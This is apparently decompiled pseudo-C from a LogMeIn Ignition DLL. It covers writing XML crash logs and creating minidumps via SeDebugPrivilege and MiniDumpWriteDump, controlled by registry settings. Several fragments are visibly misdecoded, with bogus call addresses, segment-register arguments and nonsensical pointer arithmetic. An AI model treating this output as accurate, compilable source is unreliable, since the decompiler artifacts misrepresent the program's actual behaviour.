        uVar4 = FUN_1000bfa0(L"  <exception>",0xffffffff);
        *param_1 = uVar4;
        iVar2 = piVar6[3];
        if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
          uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
          *param_1 = uVar4;
        }
        uVar4 = FUN_1000bfa0(L"</exception>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
      }
      if (piVar6[2] != 0) {
        uVar4 = FUN_1000bfa0(L"  <exceptioncode>0x",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_10031100(piVar6[2],0,0x10);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(L"</exceptioncode>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
      }
      if (((piVar6[3] != 0) && (*(int *)(piVar6[3] + 8) != 0)) || (piVar6[4] != 0)) {
        uVar4 = FUN_1000bfa0(L"  <exceptionat>0x",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_10031100(piVar6[5],piVar6[5] >> 0x1f,0x10);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(L"</exceptionat>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
      }
      uVar4 = FUN_1000bfa0(L"  <threadid>0x",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_10031100(piVar6[6],piVar6[7],0x10);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(L"</threadid>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
      if ((piVar6[8] != 0) && (*(int *)(piVar6[8] + 8) != 0)) {
        uVar4 = FUN_1000bfa0(L"  <threadname>",0xffffffff);
        *param_1 = uVar4;
        iVar2 = piVar6[8];
        if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
          uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
          *param_1 = uVar4;
        }
        uVar4 = FUN_1000bfa0(L"</threadname>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
      }
      uVar4 = FUN_1000bfa0(L"  <stack>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
      for (piVar8 = *(int **)(piVar6[9] + 4); piVar8 != (int *)0xffffffff; piVar8 = (int *)piVar8[6]
          ) {
        uVar4 = FUN_1000bfa0(L"  <stackitem>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
        if ((*piVar8 != 0) && (*(int *)(*piVar8 + 8) != 0)) {
          uVar4 = FUN_1000bfa0(L"   <dllname>",0xffffffff);
          *param_1 = uVar4;
          iVar2 = *piVar8;
          if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
            uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
            *param_1 = uVar4;
          }
          uVar4 = FUN_1000bfa0(L"</dllname>",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
          *param_1 = uVar4;
        }
        if (piVar8[1] != 0) {
          uVar4 = FUN_1000bfa0(L"   <absaddr>0x",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_10031100(piVar8[1],piVar8[1] >> 0x1f,0x10);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(L"</absaddr>",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
          *param_1 = uVar4;
        }
        if ((piVar8[2] != 0) || (piVar8[1] != 0)) {
          uVar4 = FUN_1000bfa0(L"   <reladdr>0x",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_10031100(piVar8[2],piVar8[2] >> 0x1f,0x10);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(L"</reladdr>",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
          *param_1 = uVar4;
        }
        if ((piVar8[3] != 0) && (*(int *)(piVar8[3] + 8) != 0)) {
          uVar4 = FUN_1000bfa0(L"   <fnname>",0xffffffff);
          *param_1 = uVar4;
          iVar2 = piVar8[3];
          if ((iVar2 != 0) && (*(int *)(iVar2 + 8) != 0)) {
            uVar4 = FUN_1000bfa0(iVar2 + 0xc,*(undefined4 *)(iVar2 + 8));
            *param_1 = uVar4;
          }
          uVar4 = FUN_1000bfa0(L"</fnname>",0xffffffff);
          *param_1 = uVar4;
          uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
          *param_1 = uVar4;
        }
        uVar4 = FUN_1000bfa0(L"  </stackitem>",0xffffffff);
        *param_1 = uVar4;
        uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
        *param_1 = uVar4;
      }
      uVar4 = FUN_1000bfa0(L"  </stack>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(L" </thread>",0xffffffff);
      *param_1 = uVar4;
      uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
      *param_1 = uVar4;
      piVar6 = (int *)*piVar6;
    } while (piVar6 != (int *)param_1[0x18]);
  }
  uVar4 = FUN_1000bfa0(L"</crashlog>",0xffffffff);
  *param_1 = uVar4;
  uVar4 = FUN_1000bfa0(&DAT_100874a8,0xffffffff);
  *param_1 = uVar4;
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10032380 */

void __thiscall FUN_10032380(int *param_1,short *param_2,int param_3,char param_4,int param_5)

{
  short *psVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined4 uVar6;
  undefined4 *puVar7;
  int *piVar8;
  int *piVar9;
  int iVar10;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  int *extraout_ECX_09;
  int *extraout_ECX_10;
  int *extraout_ECX_11;
  int *extraout_ECX_12;
  int *extraout_ECX_13;
  int *extraout_ECX_14;
  undefined4 extraout_ECX_15;
  undefined4 extraout_ECX_16;
  undefined4 extraout_ECX_17;
  undefined4 extraout_ECX_18;
  undefined4 extraout_ECX_19;
  undefined4 extraout_ECX_20;
  undefined4 extraout_ECX_21;
  undefined4 extraout_ECX_22;
  int *extraout_ECX_23;
  undefined4 extraout_ECX_24;
  undefined2 in_CS;
  ushort in_DS;
  undefined2 uVar11;
  wchar_t *pwVar12;
  undefined4 uVar13;
  wchar_t *pwVar14;
  wchar_t *pwVar15;
  undefined4 uVar16;
  int local_10c;
  int *local_108;
  int *local_104;
  int local_100;
  int local_fc;
  int local_f8;
  int local_f4;
  int *local_f0;
  int *local_ec;
  int *local_e8;
  int *local_e4;
  int *local_e0;
  int *local_dc;
  int *local_d8;
  undefined4 local_d4;
  int local_c4;
  int local_b0;
  int local_ac;
  int *local_a8;
  int *local_a4;
  int local_a0;
  int *local_9c;
  short *local_98;
  int local_94;
  int local_90;
  int local_78;
  int local_5c;
  int local_44;
  int local_3c;
  undefined1 local_34 [4];
  undefined1 *local_30;
  undefined1 local_28 [20];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076823;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_a0 = param_5;
  local_98 = param_2;
  *param_1 = param_3;
  local_108 = param_1;
  local_14 = uVar3;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    iVar4 = FUN_1000bd10(uVar3);
    uVar6 = extraout_ECX_00;
  }
  else {
    iVar4 = FUN_1000ba60();
    uVar6 = extraout_ECX;
  }
  param_1[1] = iVar4;
  local_8._0_1_ = 0;
  local_8._1_3_ = 0;
  param_1[2] = 5;
  *(char *)(param_1 + 3) = param_4;
  local_90 = 0;
  if (param_4 != '\0') {
    piVar5 = (int *)FUN_10033a00(param_2,uVar6);
    iVar4 = *piVar5;
    if (iVar4 == 0) {
      iVar4 = 1;
    }
    FUN_1001be20(iVar4);
    local_ac = 0;
    local_a8 = (int *)0x0;
    local_8._0_1_ = 1;
    local_90 = 0;
    if (local_b0 == 2) {
      piVar5 = (int *)FUN_1000bd10(uVar3);
      local_ec = piVar5;
      iVar4 = FUN_1001d340(&local_ec);
      if ((iVar4 == local_c4) || (cVar2 = FUN_1001d1f0(&local_ec,iVar4 + 0x10), cVar2 != '\0')) {
        local_10c = local_c4;
        piVar8 = &local_10c;
      }
      else {
        local_f8 = iVar4;
        piVar8 = &local_f8;
      }
      iVar4 = *piVar8;
      if (piVar5 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar5;
        *piVar5 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
      if (local_c4 == iVar4) {
        if (local_ac == 0) {
          local_9c = (int *)FUN_10058463(0x40,&DAT_10098020);
          local_8._0_1_ = 2;
          if (local_9c == (int *)0x0) {
            local_ac = 0;
          }
          else {
            uVar6 = FUN_1003abd0();
            local_ac = FUN_1003c970(uVar6);
          }
          local_8._0_1_ = 1;
          if (local_ac == 0) {
            local_90 = 0;
            goto LAB_10032735;
          }
          FUN_1003ade0();
          FUN_1003aff0();
          if (local_ac != 0) goto LAB_10032597;
        }
        else {
LAB_10032597:
          iVar4 = FUN_1003cb30(local_ac,&DAT_10088e54);
          if (((iVar4 != 0) && (iVar4 = FUN_1003cb30(extraout_ECX_01,&DAT_10088e54), iVar4 != 0)) &&
             (iVar4 = FUN_1003cb30(extraout_ECX_02,L"Software"), iVar4 != 0)) {
            pwVar14 = L"LogMeIn Ignition";
            pwVar12 = L"Software";
            uVar6 = extraout_ECX_03;
            uVar16 = extraout_ECX_03;
            FUN_1003cb30(extraout_ECX_03,&DAT_10088e54);
            FUN_1003cb30(uVar6,pwVar12);
            iVar4 = FUN_1003cb10(uVar16,pwVar14);
            if (iVar4 != 0) {
              pwVar15 = L"Settings";
              pwVar14 = L"LogMeIn Ignition";
              pwVar12 = L"Software";
              uVar6 = extraout_ECX_04;
              uVar16 = extraout_ECX_04;
              uVar13 = extraout_ECX_04;
              FUN_1003cb30(extraout_ECX_04,&DAT_10088e54);
              FUN_1003cb30(uVar6,pwVar12);
              FUN_1003cb30(uVar16,pwVar14);
              iVar4 = FUN_1003cb10(uVar13,pwVar15);
              if (iVar4 != 0) {
                pwVar15 = L"Settings";
                pwVar14 = L"LogMeIn Ignition";
                pwVar12 = L"Software";
                uVar6 = extraout_ECX_05;
                uVar16 = extraout_ECX_05;
                uVar13 = extraout_ECX_05;
                FUN_1003cb30(extraout_ECX_05,&DAT_10088e54);
                FUN_1003cb30(uVar6,pwVar12);
                FUN_1003cb30(uVar16,pwVar14);
                FUN_1003cb30(uVar13,pwVar15);
                iVar4 = FUN_1003cb10(extraout_ECX_06,L"DumpFull");
                if (iVar4 == 0) {
                  FUN_1003cd30(L"dword",extraout_ECX_07,L"DumpFull");
                  puVar7 = (undefined4 *)FUN_1003cce0();
                  uVar6 = FUN_10039c20(0,extraout_ECX_08);
                  *puVar7 = uVar6;
                }
                else {
                  uVar6 = extraout_ECX_07;
                  FUN_1003cb30(extraout_ECX_07,L"DumpFull");
                  uVar16 = 0x100326b2;
                  FUN_1003cce0();
                  local_90 = FUN_10039b90(uVar6,uVar16);
                }
              }
            }
          }
        }
        local_f0 = (int *)FUN_1000bd10();
        local_8._0_1_ = 3;
        piVar5 = (int *)FUN_1001d0f0(&local_f0);
        local_8._0_1_ = 1;
        *piVar5 = local_90;
        if (local_f0 != (int *)0x0) {
          LOCK();
          iVar4 = *local_f0;
          *local_f0 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_f0);
          }
        }
      }
      else {
        local_90 = *(int *)(iVar4 + 0x14);
      }
    }
    else {
      local_90 = FUN_1001c390(L"DumpFull",0,0,0);
    }
LAB_10032735:
    local_94 = 0;
    if (local_b0 == 2) {
      piVar8 = (int *)FUN_1000bd10();
      local_dc = piVar8;
      iVar4 = FUN_1001d340(&local_dc);
      piVar5 = extraout_ECX_10;
      if ((iVar4 == local_c4) ||
         (cVar2 = FUN_1001d1f0(&local_dc,iVar4 + 0x10), piVar5 = extraout_ECX_11, cVar2 != '\0')) {
        local_fc = local_c4;
        piVar9 = &local_fc;
      }
      else {
        local_100 = iVar4;
        piVar9 = &local_100;
      }
      iVar4 = *piVar9;
      if (piVar8 != (int *)0x0) {
        LOCK();
        iVar10 = *piVar8;
        *piVar8 = iVar10 + -1;
        UNLOCK();
        if (iVar10 + -1 < 0) {
          FUN_100579ee(piVar8);
          piVar5 = extraout_ECX_12;
        }
      }
      if (local_c4 == iVar4) {
        if (local_ac == 0) {
          local_9c = (int *)FUN_10058463(0x40,&DAT_10098020);
          local_8._0_1_ = 4;
          if (local_9c == (int *)0x0) {
            local_ac = 0;
            piVar5 = extraout_ECX_13;
          }
          else {
            uVar6 = FUN_1003abd0();
            local_ac = FUN_1003c970(uVar6);
            piVar5 = extraout_ECX_14;
          }
          local_8._0_1_ = 1;
          if (local_ac == 0) {
            iVar4 = 0;
            goto LAB_10032a13;
          }
          FUN_1003ade0();
          FUN_1003aff0();
          if (local_ac != 0) goto LAB_1003286d;
        }
        else {
LAB_1003286d:
          iVar4 = FUN_1003cb30(local_ac,&DAT_10088e54);
          if (((iVar4 != 0) && (iVar4 = FUN_1003cb30(extraout_ECX_15,&DAT_10088e54), iVar4 != 0)) &&
             (iVar4 = FUN_1003cb30(extraout_ECX_16,L"Software"), iVar4 != 0)) {
            pwVar14 = L"LogMeIn Ignition";
            pwVar12 = L"Software";
            uVar6 = extraout_ECX_17;
            uVar16 = extraout_ECX_17;
            FUN_1003cb30(extraout_ECX_17,&DAT_10088e54);
            FUN_1003cb30(uVar6,pwVar12);
            iVar4 = FUN_1003cb10(uVar16,pwVar14);
            if (iVar4 != 0) {
              pwVar15 = L"Settings";
              pwVar14 = L"LogMeIn Ignition";
              pwVar12 = L"Software";
              uVar6 = extraout_ECX_18;
              uVar16 = extraout_ECX_18;
              uVar13 = extraout_ECX_18;
              FUN_1003cb30(extraout_ECX_18,&DAT_10088e54);
              FUN_1003cb30(uVar6,pwVar12);
              FUN_1003cb30(uVar16,pwVar14);
              iVar4 = FUN_1003cb10(uVar13,pwVar15);
              if (iVar4 != 0) {
                pwVar15 = L"Settings";
                pwVar14 = L"LogMeIn Ignition";
                pwVar12 = L"Software";
                uVar6 = extraout_ECX_19;
                uVar16 = extraout_ECX_19;
                uVar13 = extraout_ECX_19;
                FUN_1003cb30(extraout_ECX_19,&DAT_10088e54);
                FUN_1003cb30(uVar6,pwVar12);
                FUN_1003cb30(uVar16,pwVar14);
                FUN_1003cb30(uVar13,pwVar15);
                iVar4 = FUN_1003cb10(extraout_ECX_20,L"DumpFlags");
                if (iVar4 == 0) {
                  FUN_1003cd30(L"dword",extraout_ECX_21,L"DumpFlags");
                  puVar7 = (undefined4 *)FUN_1003cce0();
                  uVar6 = FUN_10039c20(0,extraout_ECX_22);
                  *puVar7 = uVar6;
                }
                else {
                  uVar6 = extraout_ECX_21;
                  FUN_1003cb30(extraout_ECX_21,L"DumpFlags");
                  uVar16 = 0x10032988;
                  FUN_1003cce0();
                  local_94 = FUN_10039b90(uVar6,uVar16);
                }
              }
            }
          }
        }
        local_e4 = (int *)FUN_1000bd10();
        local_8._0_1_ = 5;
        piVar5 = (int *)FUN_1001d0f0(&local_e4);
        *piVar5 = local_94;
        piVar5 = local_e4;
        iVar4 = local_94;
        if (local_e4 != (int *)0x0) {
          LOCK();
          iVar10 = *local_e4;
          *local_e4 = iVar10 + -1;
          UNLOCK();
          if (iVar10 + -1 < 0) {
            FUN_100579ee(local_e4);
            piVar5 = extraout_ECX_23;
            iVar4 = local_94;
          }
        }
      }
      else {
        iVar4 = *(int *)(iVar4 + 0x14);
      }
    }
    else {
      local_94 = FUN_1001c390(L"DumpFlags",0,0,0);
      piVar5 = extraout_ECX_09;
      iVar4 = local_94;
    }
LAB_10032a13:
    local_8._0_1_ = 0;
    if (local_ac != 0) {
      FUN_1003a1b0(piVar5);
    }
    if (local_a8 != (int *)0x0) {
      LOCK();
      iVar10 = *local_a8;
      *local_a8 = iVar10 + -1;
      UNLOCK();
      if (iVar10 + -1 < 0) {
        FUN_100579ee(local_a8);
      }
    }
    FUN_1001cff0();
    param_2 = local_98;
    if (local_90 == 0) {
      if (iVar4 != 0) {
        param_1[2] = iVar4;
      }
    }
    else {
      param_1[2] = param_1[2] | 2;
    }
  }
  if ((DAT_1009b468 & 1) == 0) {
    DAT_1009b468 = DAT_1009b468 | 1;
    local_8._0_1_ = 6;
    FUN_10015880();
    FUN_10057b51(&DAT_10078460);
    local_8._0_1_ = 0;
  }
  piVar5 = DAT_1009b46c;
  local_a4 = DAT_1009b46c;
  if ((DAT_1009b470 != 0) && (param_1[2] = param_1[2] | 0x100, local_90 != 0)) {
    param_1[2] = param_1[2] | 0x260;
  }
  if (piVar5[2] == 0) goto LAB_10032e89;
  FUN_1002de70(L"SeDebugPrivilege",0);
  local_8._0_1_ = 7;
  local_f4 = 0;
  if (local_a0 == 0) {
    local_f4 = 1;
    local_a0 = FUN_10032eb0();
    if (local_a0 != 0) goto LAB_10032b14;
  }
  else {
LAB_10032b14:
    FUN_1002e2e0(1,4,0);
    local_8._0_1_ = 8;
    uVar11 = 0x1003;
    FUN_104a1125(param_2,0xc0000000,1,local_34,2,0x8000080,0);
    iVar4 = func_0xff708589(CONCAT22(uVar11,in_CS));
    if (iVar4 != -1) {
      FUN_10104da2(extraout_ECX_24);
      iVar4 = *(int *)(*param_1 + 0x14);
      if (*(int *)(*param_1 + 0x18) == 0) {
        if (*(int *)(iVar4 + 0x10) == 0) {
          iVar10 = local_a4[2];
          iVar4 = 0;
        }
        else {
          iVar4 = iVar4 + 0xc;
          iVar10 = local_a4[2];
        }
      }
      else {
        iVar10 = local_a4[2];
        iVar4 = 0;
      }
      local_90 = FUN_10032fa0(local_94,param_1[2],iVar4,iVar10);
      if (local_90 == 0) {
        local_d8 = (int *)FUN_100581b4(0x40e);
        if (local_d8 != (int *)0x0) {
          local_d8[1] = 0x200;
          *local_d8 = 0;
          local_d8[2] = 0;
          *(undefined2 *)(local_d8 + 3) = 0;
        }
        local_d4 = FUN_10327740(&stack0xfffffffc);
        FUN_1001e820();
        *(undefined4 *)(*(int *)(*param_1 + 0x14) + 0x344) = local_d4;
        if (((local_d8 == (int *)0x0) || (local_d8 + 3 == (int *)0x0)) || ((short)local_d8[3] != 0))
        {
          piVar5 = (int *)FUN_1000bd10();
        }
        else {
          piVar5 = (int *)FUN_1000ba60();
        }
        local_8 = CONCAT31(local_8._1_3_,10);
        local_a4 = piVar5;
        piVar8 = (int *)FUN_1000ae10(&local_104);
        if (*piVar8 == 0) {
          iVar4 = 0;
        }
        else {
          iVar4 = *piVar8 + 0xc;
        }
        FUN_10006250("MiniDumpWriteDump failed. err: %s\n",iVar4);
        if (local_104 != (int *)0x0) {
          LOCK();
          iVar4 = *local_104;
          *local_104 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_104);
          }
        }
        if (piVar5 != (int *)0x0) {
          LOCK();
          iVar4 = *piVar5;
          *piVar5 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(piVar5);
          }
        }
        FUN_10006250("- hProcess %x\n",local_a0);
        FUN_10006250("- hDump %x\n",local_94);
        local_8._0_1_ = 8;
        param_2 = local_98;
        if (local_d8 != (int *)0x0) {
          LOCK();
          iVar4 = *local_d8;
          *local_d8 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_d8);
            param_2 = local_98;
          }
        }
      }
      else {
        FUN_1066cc87(param_2);
      }
      (*DAT_10079270)(local_94);
      if (local_90 == 0) {
        if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
          piVar5 = (int *)FUN_1000bd10();
        }
        else {
          piVar5 = (int *)FUN_1000ba60();
        }
        local_8._0_1_ = 0xb;
        local_e8 = piVar5;
        FUN_100213b0(&local_e8);
        if (local_78 == 0) {
          if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
            piVar8 = (int *)FUN_1000bd10();
          }
          else {
            piVar8 = (int *)FUN_1000ba60();
          }
          local_8._0_1_ = 0xc;
          local_e0 = piVar8;
          piVar9 = (int *)FUN_1000ae10(&local_9c);
          if (*piVar9 == 0) {
            iVar4 = 0;
          }
          else {
            iVar4 = *piVar9 + 0xc;
          }
          FUN_10006250("- dumpsize is 0, try to delete %s\n",iVar4);
          if (local_9c != (int *)0x0) {
            LOCK();
            iVar4 = *local_9c;
            *local_9c = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(local_9c);
            }
          }
          if (piVar8 != (int *)0x0) {
            LOCK();
            iVar4 = *piVar8;
            *piVar8 = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(piVar8);
            }
          }
          iVar4 = 4;
          iVar10 = FUN_1005a7b5(local_98);
          psVar1 = local_98;
          while ((iVar10 != 0 && (iVar4 = iVar4 + -1, iVar4 != 0))) {
            (*DAT_10079310)(0x32);
            iVar10 = FUN_1005a7b5(psVar1);
          }
        }
        if (piVar5 != (int *)0x0) {
          LOCK();
          iVar4 = *piVar5;
          *piVar5 = *piVar5 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(piVar5);
          }
        }
      }
      if (local_f4 != 0) {
        (*DAT_10079270)(local_a0);
      }
    }
    if ((local_28 != local_30) && (local_30 != (undefined1 *)0x0)) {
      (*DAT_10079288)(local_30);
    }
  }
  if (((local_44 != 0) && (local_3c != 0)) && (local_5c != 0)) {
    FUN_10347153(local_5c);
    uVar3 = (uint)in_DS;
  }
  if ((DAT_10079270 != (code *)0x0) && (local_5c != 0)) {
    (*DAT_10079270)(local_5c,uVar3);
  }
LAB_10032e89:
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10032eb0 */

void __fastcall FUN_10032eb0(undefined4 param_1)

{
  int iVar1;
  int local_3c;
  undefined1 local_34 [16];
  int local_24;
  int local_1c;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076858;
  local_10 = ExceptionList;
  local_14 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((DAT_1009b4dc & 1) == 0) {
    DAT_1009b4dc = DAT_1009b4dc | 1;
    FUN_1001a9a0(local_14);
    FUN_10057b51(&DAT_100784c0);
  }
  if (DAT_1009b4f4 != (code *)0x0) {
    FUN_1002de70(L"SeDebugPrivilege",0);
    local_8 = 0;
    iVar1 = (*DAT_1009b4f4)(0x1fffff,0,param_1);
    if (iVar1 == 0) {
      (*DAT_1009b4f4)(0x410,0,param_1);
    }
    if (((local_24 != 0) && (local_1c != 0)) && (local_3c != 0)) {
      FUN_1015e683(local_3c,0,local_34,0,0,0);
    }
    if ((DAT_10079270 != (code *)0x0) && (local_3c != 0)) {
      (*DAT_10079270)(local_3c);
    }
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10032fa0 */

void __fastcall
FUN_10032fa0(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,code *param_6)

{
  void *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = FUN_100620b0;
  local_14 = ExceptionList;
  local_c = DAT_100956e0 ^ 0x10090d40;
  ExceptionList = &local_14;
  local_8 = 0;
  (*param_6)(param_1,param_2,param_3,param_4,param_5,0,0);
  ExceptionList = local_14;
  return;
}



/* Function: FUN_10033040 */

void __thiscall FUN_10033040(int *param_1,short *param_2)

{
  char cVar1;
  int iVar2;
  undefined **ppuVar3;
  char *pcVar4;
  int *piVar5;
  undefined4 uVar6;
  undefined1 uVar7;
  int *local_64;
  undefined1 local_60 [4];
  undefined1 *local_5c;
  undefined1 local_54 [20];
  int local_40;
  undefined1 local_38 [16];
  int local_28;
  undefined4 local_24;
  int local_20;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076898;
  local_10 = ExceptionList;
  local_18 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    iVar2 = FUN_1000bd10(local_18);
  }
  else {
    iVar2 = FUN_1000ba60();
  }
  *param_1 = iVar2;
  local_8 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  FUN_1002de70(L"SeCreateGlobalPrivilege",0);
  local_8 = CONCAT31(local_8._1_3_,2);
  cVar1 = FUN_10023720(local_24);
  uVar6 = 0;
  if (cVar1 != '\0') goto LAB_10033102;
  piVar5 = (int *)*param_1;
  uVar6 = 1;
  if (piVar5 == (int *)0x0) {
LAB_100330fe:
    piVar5 = (int *)0x0;
  }
  else {
    if (*piVar5 != 0) {
      LOCK();
      iVar2 = *piVar5;
      *piVar5 = iVar2 + -1;
      UNLOCK();
      if (iVar2 + -1 < 0) {
        FUN_100579ee(piVar5);
      }
      goto LAB_100330fe;
    }
    piVar5[2] = 0;
    *(undefined2 *)(piVar5 + 3) = 0;
  }
  *param_1 = (int)piVar5;
LAB_10033102:
  FUN_1002e2e0(1,4,uVar6);
  local_8 = CONCAT31(local_8._1_3_,3);
  iVar2 = *param_1;
  uVar7 = iVar2 == 0;
  if (((bool)uVar7) || (uVar7 = *(int *)(iVar2 + 8) == 0, (bool)uVar7)) {
    ppuVar3 = &PTR_10083554;
  }
  else if (iVar2 == 0) {
    ppuVar3 = (undefined **)0x0;
    uVar7 = true;
  }
  else {
    ppuVar3 = (undefined **)(iVar2 + 0xc);
    uVar7 = ppuVar3 == (undefined **)0x0;
  }
  iVar2 = FUN_1064c98e(param_1,local_60,1,0,ppuVar3);
  param_1[1] = iVar2;
  pcVar4 = (char *)FUN_1051c180();
  if (!(bool)uVar7) {
    *pcVar4 = *pcVar4 + (char)pcVar4;
    if (*pcVar4 == '\0') {
      param_1[2] = 1;
    }
    if (param_1[1] == 0) {
      FUN_1005b980(1);
    }
    FUN_1000ae10(&local_64);
    FUN_10006250();
  }
  if (local_64 != (int *)0x0) {
    LOCK();
    iVar2 = *local_64;
    *local_64 = *local_64 + -1;
    UNLOCK();
    if (iVar2 + -1 < 0) {
      FUN_100579ee(local_64);
    }
  }
  if ((local_54 != local_5c) && (local_5c != (undefined1 *)0x0)) {
    (*DAT_10079288)(local_5c);
  }
  if (((local_28 != 0) && (local_20 != 0)) && (local_40 != 0)) {
    FUN_105447a3(local_38,local_40,0,local_38,0,0,0);
  }
  if ((DAT_10079270 != (code *)0x0) && (local_40 != 0)) {
    (*DAT_10079270)(local_40);
  }
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10033210 */

int __fastcall FUN_10033210(undefined4 *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  
  iVar3 = param_1[1];
  if (iVar3 != 0) {
    iVar3 = (*DAT_10079270)(iVar3);
    param_1[1] = 0;
  }
  piVar2 = (int *)*param_1;
  if (piVar2 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar2;
    iVar3 = *piVar2;
    *piVar2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar3 = FUN_100579ee(piVar2);
    }
  }
  return iVar3;
}



/* Function: FUN_10033240 */

undefined4 * __thiscall FUN_10033240(undefined4 *param_1,short *param_2)

{
  undefined4 uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100768d3;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    uVar1 = FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
  }
  else {
    uVar1 = FUN_1000ba60();
  }
  *param_1 = uVar1;
  local_8 = 0;
  FUN_100333d0(param_2);
  local_8 = CONCAT31(local_8._1_3_,1);
  param_1[5] = 0;
  FUN_10033350();
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_100332d0 */

undefined4 * __thiscall FUN_100332d0(undefined4 *param_1,undefined4 param_2)

{
  uint uVar1;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10076903;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = param_2;
  param_1[3] = 1;
  *(undefined1 *)(param_1 + 4) = 0;
  local_8 = 1;
